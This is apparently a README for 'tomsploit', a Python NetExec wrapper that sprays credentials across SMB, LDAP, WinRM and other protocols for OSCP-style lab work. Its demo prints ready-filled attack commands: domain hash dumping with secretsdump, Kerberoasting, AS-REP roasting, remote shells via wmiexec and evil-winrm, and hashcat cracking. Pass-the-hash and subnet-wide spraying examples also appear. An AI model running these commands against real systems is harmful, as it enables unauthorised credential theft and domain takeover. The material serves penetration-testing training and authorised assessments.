A NetExec orchestrator built around the OSCP enumeration workflow: test one credential set against every relevant protocol on every host, and when something works, print the exact commands you'd normally tab back to your notes for.

Why
You're a few hours into an exam machine. You spray creds, SMB lights up green, and now you're googling "impacket secretsdump just-dc syntax" again. Or "evil-winrm hash flag". Or "xfreerdp pass the hash."
tomsploit removes that friction. When a credential works, it prints follow-up commands with your username, password, hash, IP, and domain already filled in — copy, paste, run.

Demo
text
════════════════════════════════════════════════════════════
  ⚡ tomsploit
════════════════════════════════════════════════════════════

  Targets         │ 1           Protocols │ all
  Users           │ 1           Workers   │ 15
  Credentials     │ 1p / 0h     Timeout   │ 30s/attempt
  Log file        │ 2026-05-27_15-30-00.txt
  Total attempts  │ 15
  
════════════════════════════════════════════════════════════

  ► 172.16.1.20

────────────────────────────────────────────────────────────
  📋 Results (172.16.1.20) [DC] [3.4s]
────────────────────────────────────────────────────────────
    Windows Server 2019 (name:DC01) (domain:corp.local)

  ✔ SMB (domain)         DC01 corp.local\admin:Password123! (Pwn3d!)
  ✔ LDAP (domain)        DC01 corp.local\admin:Password123!
  ✔ WMI (domain)         DC01 corp.local\admin:Password123! (Pwn3d!)
  ✔ WINRM (domain)       DC01 corp.local\admin:Password123! (Pwn3d!)
────────────────────────────────────────────────────────────

  ✓ VALID CREDENTIALS

    ► SMB (domain)        │ corp.local\admin:Password123! (Pwn3d!) [admin]
    ► LDAP (domain)       │ corp.local\admin:Password123!
    ► WMI (domain)        │ corp.local\admin:Password123! (Pwn3d!) [admin]
    ► WINRM (domain)      │ corp.local\admin:Password123! (Pwn3d!) [admin]

  💡 Suggested Commands [DC]
  ──────────────────────────────────────────────────────────

    ► [SMB]
        # crackmapexec --shares
        crackmapexec smb 172.16.1.20 -u admin -p Password123! --shares

        # secretsdump -just-dc
        impacket-secretsdump -just-dc corp.local/admin:Password123!@172.16.1.20

        # smbclient (interactive)
        smbclient //172.16.1.20/<SHARE> -U 'corp.local\admin%Password123!'

    ► [LDAP]
        # kerbrute userenum
        kerbrute userenum --dc 172.16.1.20 -d corp.local /usr/share/seclists/Usernames/Names/names.txt

        # AS-REP roast
        impacket-GetNPUsers corp.local/admin:Password123! -request -format hashcat -outputfile asrep.hash -dc-ip 172.16.1.20

        # Kerberoast (SPN tickets)
        impacket-GetUserSPNs -request -dc-ip 172.16.1.20 corp.local/admin:Password123! -outputfile kerb.hash

        # BloodHound
        bloodhound-python -u admin -p Password123! -d corp.local -dc DC01.corp.local -ns 172.16.1.20 -c All --zip

    ► [WMI]
        # wmiexec
        impacket-wmiexec corp.local/admin:Password123!@172.16.1.20

    ► [WINRM]
        # evil-winrm
        evil-winrm -i 172.16.1.20 -u admin -p Password123!

════════════════════════════════════════════════════════════
  🎯 Next Steps
════════════════════════════════════════════════════════════

  Domain Controllers detected
  ────────────────────────────────
    ► DC01 (172.16.1.20) — corp.local

  No-auth AD attacks (try alongside any creds found above)
  ────────────────────────────────
        # enumerate valid usernames at corp.local
        kerbrute userenum --dc 172.16.1.20 -d corp.local /usr/share/seclists/Usernames/Names/names.txt

        # AS-REP roast — any user with preauth disabled = free hash
        impacket-GetNPUsers corp.local/ -dc-ip 172.16.1.20 -request -no-pass -usersfile users.txt

  Cracking captured hashes
  ────────────────────────────────
        # AS-REP (Kerberos 5 AS-REP)
        hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt

        # Kerberoast (Kerberos 5 TGS-REP)
        hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt

        # NTDS / SAM (NTLM)
        hashcat -m 1000 ntds.hash /usr/share/wordlists/rockyou.txt
════════════════════════════════════════════════════════════

Features

10 protocols sprayed in parallel: SMB, LDAP, WinRM, WMI, RDP, MSSQL, SSH, FTP, VNC, NFS
Password, hash (NTLM), and Kerberos authentication — auto-filtered per protocol so hashes never hit SSH
DC detection drives smarter follow-ups: secretsdump -just-dc over a DC instead of the full SAM/LSA/NTDS chain that hangs on RemoteRegistry
CIDR expansion with a configurable per-block host cap
Pre-flight port probe skips closed ports so a /24 scan finishes in minutes
Anonymous SMB detection with its own follow-up command set
Guest-mapping detection — separates real Samba guest fallbacks from legitimate auth (no more "Pwn3d!" excitement that was actually map to guest = bad user)
OSCP-tuned suggestions — enum4linux-ng, crackmapexec --shares, kerbrute userenum, impacket-GetUserSPNs, BloodHound with the right collection method, etc.
Post-scan Next Steps with no-auth AD attacks (worth running even when you already have creds — finds users your wordlist missed) and hashcat mode references
Outputs: TSV credentials file (--creds-file), structured JSON (--json-output), nxc log
Multi-target safe — an error on one host doesn't kill the rest
Graceful Ctrl-C — first cancels in-flight calls, second forces exit


Install
Single-file Python script, no packaging required:
bashgit clone https://github.com/<your-user>/tomsploit.git
cd tomsploit
chmod +x tomsploit.py
sudo cp tomsploit.py /usr/local/bin/tomsploit   # optional
Requirements

Python 3.10+
NetExec on $PATH (nxc --version should work)

The follow-up commands assume standard Kali tooling — impacket-*, evil-winrm, crackmapexec, kerbrute, bloodhound-python, hashcat, xfreerdp3, etc. None of these are required to run tomsploit; they're only referenced in the suggested commands you can copy-paste.

Usage
texttomsploit -t <TARGET> -u <USER> -p <PASSWORD>
tomsploit -t <TARGET> -u <USER> -H <NTLM_HASH>
tomsploit -t <TARGET> -u <USER> -k                  # use existing Kerberos ticket cache
Examples
bash# Single host, single credential
tomsploit -t 192.168.1.10 -u admin -p 'Password123!'

# /24 with wordlists
tomsploit -t 192.168.1.0/24 -u users.txt -p passwords.txt

# Pass-the-hash across a subnet
tomsploit -t 192.168.1.0/24 -u Administrator -H aad3b...:31d6cfe0...

# Kerberos ticket-cache auth (requires KRB5CCNAME)
export KRB5CCNAME=./admin.ccache
tomsploit -t dc01.corp.local -u admin -k

# Selective protocols
tomsploit -t target -u admin -p pw --protocols smb,winrm,rdp

# Save valid creds to a side file, dump structured results to JSON
tomsploit -t targets.txt -u u.txt -p p.txt \
    --creds-file creds.tsv --json-output scan.json
Common flags
FlagPurpose-t, --targetIP, hostname, CIDR, or path to a file of any of these-u, --userUsername or path to a users file-p, --passwordPassword or path to a passwords file-H, --hashNTLM hash (LM:NT or NT) or path to a hash file-k, --kerberosUse existing Kerberos ticket cache--protocolsComma-separated subset to scan--creds-fileAppend valid credentials to TSV file--json-outputWrite structured results to JSON file--no-port-probeSkip pre-flight TCP probe (slower, sometimes more accurate)--max-cidr-hostsCap on CIDR expansion size (default 1024)-q, --quietSuppress banner and negatives--debugPrint full Python tracebacks on errors
Run tomsploit --help for the full list.

How it works

Expand targets — IPs, hostnames, CIDRs, or files of any of them are resolved to a deduplicated list.
Port probe — quick TCP connect to each protocol's default port. Hosts with no open services are skipped; protocols with closed ports are skipped per-host.
Spray — for every (target, protocol, credential) combination, run nxc <proto> <target> -u <user> {-p|-H|--use-kcache}. Tasks parallelise across protocols and hosts; combination mode is the default (every user × every secret).
Parse — [+], [-], [*], [!] lines are categorised. Successes ([+]) are split into real credentials vs Samba guest mappings; (Pwn3d!) flags admin privileges.
Suggest — for each successful (protocol, auth_type) tuple, render the relevant follow-up commands with shlex.quote so passwords with shell metacharacters paste cleanly.
Next Steps — after every target is scanned, aggregate findings: list detected DCs, emit kerbrute and AS-REP no-auth commands per unique domain, show output-file paths.
